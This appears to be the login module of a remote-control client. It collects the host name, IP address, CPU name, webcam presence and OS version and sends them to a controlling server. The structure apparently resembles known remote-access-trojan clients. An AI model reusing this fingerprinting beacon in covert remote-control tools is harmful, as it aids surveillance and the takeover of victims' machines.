#include "Login.h"
#include "Common.h"



int SendLoginInformtion(CIOCPClient* ClientObject,DWORD WebSpeed)
{
	NTSTATUS Status;


	LOGIN_INFO li = { 0 };
	
	li.IsToken = CLIENT_LOGIN;
	sockaddr_in  ClientAddressData;
	memset(&ClientAddressData, 0, sizeof(ClientAddressData));
	int ClientAddressLength = sizeof(sockaddr_in);
	getsockname(ClientObject->m_ClientSocket, (SOCKADDR*)&ClientAddressData, &ClientAddressLength);
	li.ClientAddressData = ClientAddressData.sin_addr;
	gethostname(li.HostNameData, MAX_PATH);
	ULONG ProcessNameStringLength = MAX_PATH;
	Status = ProcessorNameString(li.ProcessorNameStringData, &ProcessNameStringLength);
	li.IsWebCameraExist = IsWebCamera();
	li.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&li.OsVersionInfoEx);

	int ReturnValue = 0;
	ReturnValue = ClientObject->OnServerSending((char*)&li, sizeof(LOGIN_INFO));   //�������ݵ�������
	return ReturnValue;

}
NTSTATUS ProcessorNameString(char* ProcessorNameStringData,ULONG* ProcessorNameStringLength)
{
	HKEY	 KeyHandle;
	NTSTATUS Status;
	DWORD	Type = REG_SZ;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &KeyHandle);
	if (Status!=ERROR_SUCCESS)
	{
		return Status;
	}	
	Status = RegQueryValueEx(KeyHandle, "ProcessorNameString", NULL, &Type, (LPBYTE)ProcessorNameStringData, ProcessorNameStringLength);
	RegCloseKey(KeyHandle);
	return Status;
}


BOOL IsWebCamera()
{
	BOOL	IsOk = FALSE;
	CHAR	DriverName[MAX_PATH];
	//�����豸(����ͷ USB ��ӡ��)  -----   
	for (int i = 0; i < 10 && !IsOk; i++)
	{
		IsOk = capGetDriverDescription(i, DriverName, sizeof(DriverName), NULL, 0);
	}
	return IsOk;
}


